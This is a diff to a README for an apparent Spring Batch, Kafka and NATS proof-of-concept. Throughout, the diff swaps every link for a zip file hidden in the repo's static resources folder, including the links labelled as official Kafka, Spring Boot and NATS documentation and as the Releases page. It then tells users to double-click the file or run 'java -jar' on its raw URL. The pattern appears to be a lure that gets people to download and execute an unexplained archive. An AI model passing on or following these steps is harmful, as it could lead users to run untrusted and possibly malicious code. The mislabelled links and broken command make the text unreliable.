@@ -1,6 +1,6 @@
 # ⚡ spring-batch-kafka-nats-poc - Fast & Reliable Financial Transactions
 
-[![Download Latest Release](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Follow these simple steps to set up the application on your computer.
 
 ### 📥 Download & Install
 
-To get the software, visit [this page to download](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip).
+To get the software, visit [this page to download](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -31,18 +31,18 @@ To get the software, visit [this page to download](https://github.com/ulises5700
 Once the download is complete, you can run the application:
 
 1. **For Windows Users:**
-   - Locate the downloaded file (e.g., `https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip`).
+   - Locate the downloaded file (e.g., `https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip`).
    - Double-click the file to launch the application.
 
 2. **For macOS Users:**
    - Open Finder and navigate to the Downloads directory.
-   - Locate the downloaded file (`https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip`).
+   - Locate the downloaded file (`https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip`).
    - Double-click the file and drag the application to your Applications folder.
 
 3. **For Linux Users:**
    - Open a terminal window.
    - Navigate to the download location.
-   - Run the application with the command: `java -jar https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip`.
+   - Run the application with the command: `java -jar https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip`.
 
 Make sure to check the terminal for any output messages that may guide you further during the initial run.
 
@@ -63,9 +63,9 @@ Kafka serves as the backbone for managing events and messages between services. 
 
 For those interested in understanding more about the technologies used:
 
-- **Kafka Documentation**: [Apache Kafka](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)
-- **Spring Boot Guide**: [Spring Boot](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)
-- **NATS Documentation**: [NATS](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)
+- **Kafka Documentation**: [Apache Kafka](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
+- **Spring Boot Guide**: [Spring Boot](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
+- **NATS Documentation**: [NATS](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -96,6 +96,6 @@ This project covers several topics, including:
 - Spring Batch Processing
 - Spring Boot Framework
 
-For more information and updates, please check our [Releases page](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip) regularly.
+For more information and updates, please check our [Releases page](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip) regularly.
 
-[![Download Latest Release](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)](https://github.com/ulises5700/spring-batch-kafka-nats-poc/raw/refs/heads/main/docker/poc_kafka_spring_batch_nats_v1.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)](https://raw.githubusercontent.com/ulises5700/spring-batch-kafka-nats-poc/main/payment-gateway-service/src/main/resources/static/kafka_poc_batch_spring_nats_3.6.zip)
